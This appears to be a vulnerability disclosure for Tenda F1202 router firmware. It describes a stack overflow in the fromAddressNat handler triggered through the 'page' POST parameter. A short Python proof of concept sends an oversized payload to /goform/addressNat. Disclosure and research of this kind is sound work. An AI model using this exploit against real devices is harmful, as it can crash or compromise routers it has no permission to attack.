## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2671.html

## Affected version

F1202 V1.2.0.20(408)

## Vulnerability details

The Tenda F1202 V1.2.0.20(408) firmware has a stack overflow vulnerability in the `fromAddressNat` function. The `v3` variable receives the `page` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `page` can trigger this security vulnerability.

![image-20240319225157752](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319225157752.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addressNat"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240321221807987](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240321221807987.png)
